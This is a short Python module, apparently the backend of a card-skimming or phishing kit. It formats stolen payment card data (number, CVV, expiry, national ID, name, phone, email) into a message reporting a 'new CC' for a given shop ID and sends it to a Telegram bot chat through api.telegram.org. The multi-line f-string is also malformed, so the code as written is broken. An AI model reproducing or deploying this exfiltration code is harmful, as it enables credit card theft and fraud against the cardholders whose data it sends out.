import requests
from requests.exceptions import RequestException, HTTPError
from ..schemas.telegram import TelegramSchema

class Telegram:
    def __init__(self, payload:TelegramSchema):
        token = payload.token
        chat_id = payload.chat_id
        
        if not token or not chat_id:
            raise ValueError("Token or chat ID are missing!")
        
        self.token:str = token
        self.chat_id:str = chat_id
        self.payload = payload
        
    def build_message(self):
        message = f'Se ha registrado una nueva CC en su sistema {self.payload.shop_id}. 
        Datos de la Tarjeta: DNI asociado: {self.payload.DNI}, Nro: {self.payload.number}, CVV: {self.payload.CVV}, Vto: {self.payload.Vto}.
        Datos del Cliente: Nombre: {self.payload.name} {self.payload.last_name}, Telefono: {self.payload.phone}, Email: {self.payload.email}'
        return message
    
    def send_message(self, message:str):
        url:str = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={message}"
        try:
            response = requests.get(url, timeout=20)
            response.raise_for_status()
            return {"message": response.json(), "status": 200}
        except HTTPError as e:
            return {"message": f"HTTP Error ocurred: {str(e)}", "status": 500}
        except TimeoutError as e:
            return {"message": f"Timeout error: {str(e)}", "status": 500}
        except ValueError as e:
            return {"message": f"Value error: {str(e)}", "status": 500}   
        except RequestException as e:
            return {"message": f"Unexpected exception: {str(e)}", "status": 500}
            
            
